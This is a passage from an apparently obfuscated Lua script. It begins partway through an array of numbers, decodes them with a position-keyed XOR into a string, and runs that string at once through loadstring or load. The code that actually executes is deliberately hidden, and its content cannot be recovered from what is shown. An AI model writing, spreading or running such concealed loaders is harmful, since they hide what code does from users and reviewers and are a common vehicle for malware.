,232,194,206,204,253,245,247,178,225,252,242,248,147,184,187,186,189,188,191,190,161,236,236,225,228,232,167,232,230,255,171,183,173,248,230,237,26,88,90,120,85,84,87,86,89,88,91,90,20,26,95,16,14,23,67,79,69,8,6,21,29,32,2,30,77,82,82,78,97,126,100,114,33,60,50,56,83,120,123,122,125,124,127,126,97,96,99,98,101,40,38,53,61,0,34,62,109,113,111,32,94,71,57,18,21,20,23,22,25,24,27,26,29,28,31,82,78,67,66,78,5,80,72,73,69,102,74,71,72,12,18,14,118,117,103,70,122,123,123,88,120,117,126,50,52,22,63,62,33,32,35,34,37,36,39,38,41,40,103,101,110,109,99,46,144,130,148,129,213,201,215,141,219,173,136,159,188,158,150,146,136,148,154,192,201,196,147,137,134,132,165,139,128,137,146,228,241,240,243,242,245,244,247,246,249,248,251,250,186,189,178,187,251,135,166,182,150,161,181,176,160,171,174,226,239,158,170,190,221,217,208,211,193,209,211,229,205,215,201,219,218,217,157,151,155,247,194,203,209,226,200,212,234,192,194,198,201,132,141,253,249,241,225,247,241,182,190,172,206,249,242,238,219,243,237,221,233,233,239,230,173,166,210,242,224,228,226,254,244,174,166,180,38,17,26,6,51,27,5,53,17,17,23,30,85,94,45,27,12,15,23,7,32,18,2,8,29,74,66,80,58,13,6,26,23,63,33,17,61,61,59,50,113,122,24,54,60,47,44,27,55,37,45,54,103,109,125,0,32,58,46,25,40,62,57,43,67,24,70,92,69,85,84,93,17,89,73,93,78,21,22,52,1,0,3,2,5,4,7,6,76,70,79,32,13,12,15,14,116,126,119,24,112,122,115,63,19,18,119,115,127,38,86,112,104,116,43,43,15}
local FARRk8=""
for WCKvdC,RFhmO0 in ipairs(FdKTUL) do
FARRk8=FARRk8..string.char(bit32.bxor(bit32.bxor(RFhmO0,F5scSn),(WCKvdC-1)%256))
end
local MoHYvc=loadstring or load
MoHYvc(FARRk8)()
